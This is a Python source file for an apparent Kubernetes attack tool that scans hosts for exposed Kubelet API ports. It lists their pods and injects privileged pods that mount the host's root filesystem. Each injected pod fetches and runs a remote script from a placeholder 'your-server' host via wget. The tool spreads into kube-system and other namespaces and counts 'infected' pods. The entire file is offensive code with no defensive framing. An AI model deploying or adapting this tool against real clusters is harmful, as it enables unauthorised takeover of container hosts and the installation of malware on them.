import aiohttp
import json
from typing import Dict, List, Set
import time
import asyncio

class KubeletExploit:
    def __init__(self):
        self.kubelet_ports = [10250, 10255]
        self.infected_pods: Set[str] = set()
    
    async def scan_kubelet(self, target: str) -> tuple[bool, int]:
        """Check if Kubelet API is exposed"""
        for port in self.kubelet_ports:
            url = f"https://{target}:{port}/pods"
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            return True, port
            except:
                continue
        return False, None
    
    async def inject_pod(self, target: str, port: int, namespace: str = "default") -> bool:
        """Inject malicious pod via Kubelet API"""
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": f"system-pod-{int(time.time())}",
                "namespace": namespace
            },
            "spec": {
                "containers": [{
                    "name": "agent",
                    "image": "alpine:latest",
                    "command": ["/bin/sh"],
                    "args": ["-c", "wget http://your-server/agent.sh -O /tmp/agent.sh && sh /tmp/agent.sh"],
                    "volumeMounts": [{
                        "name": "host",
                        "mountPath": "/host"
                    }],
                    "securityContext": {
                        "privileged": True
                    }
                }],
                "volumes": [{
                    "name": "host",
                    "hostPath": {
                        "path": "/"
                    }
                }],
                "restartPolicy": "Always"
            }
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://{target}:{port}/runningpods/{namespace}"
                async with session.post(url, json=pod_manifest, ssl=False) as response:
                    if response.status in [200, 201]:
                        self.infected_pods.add(f"{target}:{namespace}")
                        return True
        except:
            pass
        
        return False
    
    async def exec_in_pod(self, target: str, port: int, pod_name: str, command: str) -> str:
        """Execute command in existing pod"""
        url = f"https://{target}:{port}/exec/{pod_name}"
        params = {
            'command': command,
            'stdin': False,
            'stdout': True,
            'stderr': True,
            'tty': False
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, params=params, ssl=False) as response:
                    if response.status == 200:
                        return await response.text()
        except:
            pass
        
        return None
    
    async def list_pods(self, target: str, port: int) -> List[Dict]:
        """List existing pods on the target"""
        url = f"https://{target}:{port}/pods"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get('items', [])
        except:
            pass
        
        return []
    
    async def exploit_target(self, target: str) -> Dict[str, any]:
        """Complete exploitation workflow for a target"""
        result = {
            'target': target,
            'vulnerable': False,
            'exploited': False,
            'pods_deployed': 0,
            'existing_pods': 0,
            'port': None
        }
        
        # Check if Kubelet API is exposed
        is_vulnerable, port = await self.scan_kubelet(target)
        result['vulnerable'] = is_vulnerable
        result['port'] = port
        
        if is_vulnerable:
            # List existing pods
            pods = await self.list_pods(target, port)
            result['existing_pods'] = len(pods)
            
            # Attempt exploitation
            success = await self.inject_pod(target, port)
            result['exploited'] = success
            
            if success:
                result['pods_deployed'] = 1
                
                # Try to deploy in other namespaces
                namespaces = ['kube-system', 'kube-public', 'default']
                for ns in namespaces:
                    if ns != 'default':  # Already tried default
                        if await self.inject_pod(target, port, ns):
                            result['pods_deployed'] += 1
        
        return result
    
    def get_infected_count(self) -> int:
        """Get total number of infected pods"""
        return len(self.infected_pods)